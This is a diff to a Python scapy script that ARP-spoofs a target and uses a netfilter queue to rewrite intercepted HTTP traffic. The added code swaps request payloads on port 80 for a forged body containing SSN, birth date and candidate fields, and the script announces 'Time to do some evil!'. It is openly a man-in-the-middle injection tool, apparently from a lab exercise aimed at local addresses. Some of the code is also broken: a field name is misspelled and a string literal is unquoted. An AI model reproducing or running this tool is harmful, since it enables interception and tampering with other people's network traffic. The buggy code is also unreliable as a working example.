@@ -34,27 +34,33 @@ def restore(target_ip, host_ip, verbose=True):
     arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac) # Switch them!
     send(arp_response, verbose=0, count=3)
 
+
+def setting_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksm
+    del packet[scapy.TCP].len
+    del packet[scapy.TCP].chksm
+    return packet
+
 #Since we look at every packet that goes through, we need to see if the current packet is an HTTP packet
 def process_packet(packet):
-    scapy_packet = IP(packet.get_payload()) #Convert the packet to the Scapy format
-    if scapy_packet.haslayer(scapy.Raw): 
-        try:
-            scapy_packet = modify_packet(scapy_packet) #Send it to be modified 
-        except IndexError:
-            pass
-        packet.set_payload(bytes(scapy_packet)) #Convert back to the other packet format
-    packet.accept() #Accept it and yeet
+    # convert to scapy packet
+    pkt_scapy = scapy.IP(packet.get_payload())
+    # check if it's http
+    if pkt_scapy.haslayer(scapy.Raw):
+        # check if its a request
+        if pkt_scapy[scapy.TCP].dport == 80:
+            #modify it!
+            modified = setting_load(pkt_scapy, "HTTP/1.1 {"SSN":"111110","DOB":"12-10-1991","Candidate":"Zach"}")
+            packet.set_payload(str(modified))
 
-#The juicy stuff - here we can modify the packet if we choose to do so! 
-def modify_packet(packet):
-    print("I can see your packet!")
-    print(packet)
-    print("Modify!")
+    packet.accept()
 
 
 if __name__ == "__main__":
     print("Time to do some evil!")
-   	#IP address of target
+    #IP address of target
     target = "127.0.0.1"
     # Here's our IP address
     host = "127.0.0.2"
@@ -86,3 +92,7 @@ if __name__ == "__main__":
         restore(host, target)
         os.system("iptables --flush")
         print("Bye!")
+
+
+
+
